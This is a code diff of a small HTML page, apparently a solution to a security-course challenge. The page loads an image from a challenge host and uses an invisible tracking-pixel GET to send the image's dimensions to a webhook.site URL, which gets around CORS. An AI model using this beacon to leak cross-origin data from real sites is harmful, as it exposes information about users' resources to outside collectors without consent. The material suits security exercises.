@@ -5,33 +5,38 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Imagen con Webhook</title>
   <style>
-    body { margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: #111; }
-    img { max-width: 100%; height: auto; }
+    body {
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #111;
+    }
+    img {
+      max-width: 100%;
+      height: auto;
+    }
   </style>
 </head>
 <body>
   <img
-  src="https://picsum.photos/400"
-  onload="notifyWebhook(this)"
-  alt="Imagen importante"
-/>
+    src="https://chl-7a6fada8-2863-407c-9e3e-b6584ecf0043-imagen-importante.softwareseguro.com.ar/profile-pic"
+    onload="notifyWebhook(this)"
+    alt="Imagen importante"
+  />
 
-<script>
-  async function notifyWebhook(img) {
-    const width = img.naturalWidth;
-    const height = img.naturalHeight;
+  <script>
+    function notifyWebhook(img) {
+      const width = img.naturalWidth;
+      const height = img.naturalHeight;
 
-    try {
-      await fetch("https://webhook.site/65240bdf-b0e0-4a90-9a32-61ac4568473b", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ width, height }),
-      });
-      console.log("Webhook enviado:", { width, height });
-    } catch (err) {
-      console.error("Error al enviar el webhook:", err);
+      // enviamos un GET como imagen invisible (sin CORS)
+      const trackingPixel = new Image();
+      trackingPixel.src = `https://webhook.site/65240bdf-b0e0-4a90-9a32-61ac4568473b?width=${width}&height=${height}`;
+
+      console.log("Webhook disparado por GET:", trackingPixel.src);
     }
-  }
-</script>
+  </script>
 </body>
 </html>
